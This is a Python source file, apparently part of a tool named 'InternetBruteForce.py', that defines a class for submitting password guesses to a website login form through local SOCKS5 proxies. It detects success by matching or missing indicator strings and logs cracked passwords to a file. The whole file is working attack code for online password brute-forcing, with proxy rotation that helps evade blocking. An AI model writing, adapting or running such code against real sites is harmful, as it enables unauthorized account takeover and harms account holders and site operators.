import requests
from sys import exit
from requests.exceptions import ProxyError
from os import system
from datetime import datetime
from ssl import SSLZeroReturnError
from socks import GeneralProxyError
from http.client import RemoteDisconnected
from urllib3.exceptions import IncompleteRead, ProtocolError


class UseProxies:
    def __init__(self, website: str, data: dict, num: int):
        # Number of requests to make
        self.data = data
        self.website = website
        self.threads = []
        self.num = num


    def thread(self, indicator: list):
        if indicator[0].lower() == 's':
            try:
                r = requests.post(self.website, data=self.data, proxies={'http': f'socks5h://localhost:{self.num}',
                                                                         'https': f'socks5h://localhost:{self.num}'}, timeout=10)
                with open('website.html', 'w') as w:
                    w.write(r.text)
                if indicator[1] in r.text and r.status_code == 200:
                    print(f"\n\n[+] Found the password {self.data}\n\n")
                    with open('password.txt', 'a') as f:
                        f.write(f"\n{str(datetime.now().time()).split('.')[0]} " + str(self.data) + "\n")
                    raise OverflowError
            except requests.exceptions.Timeout:
                system(f'notify-send "InternetBruteForce.py" "Timeout occurred on {self.num} while trying {self.data["pwd"]}"')
                raise StopAsyncIteration
            except (ProxyError, SSLZeroReturnError, ConnectionError, GeneralProxyError, RemoteDisconnected, requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError, requests.exceptions.Timeout, IncompleteRead, ProtocolError):
                exit()
        elif indicator[0].lower() == 'u':
            try:
                r = requests.post(self.website, data=self.data, proxies={'http': f'socks5h://localhost:{self.num}',
                                                                         'https': f'socks5h://localhost:{self.num}'}, timeout=10)
                with open('website.html', 'w') as w:
                    w.write(r.text)
                if indicator[1] not in r.text and r.status_code == 200:
                    print(f"\n\n[+] Found the password {self.data}\n\n\n\n")
                    with open('password.txt', 'a') as f:
                        f.write(f"\n{str(datetime.now().time()).split('.')[0]} " + str(self.data) + "\n")
                    with open('website.html', 'w') as w:
                        w.write(r.text)
                    raise OverflowError
            except requests.exceptions.Timeout:
                system(f'notify-send "InternetBruteForce.py" "Timeout occurred on {self.num} while trying {self.data["pwd"]}"')
                raise StopAsyncIteration
            except (ProxyError, SSLZeroReturnError, ConnectionError, GeneralProxyError, RemoteDisconnected, requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError, requests.exceptions.Timeout, IncompleteRead, ProtocolError):
                exit()
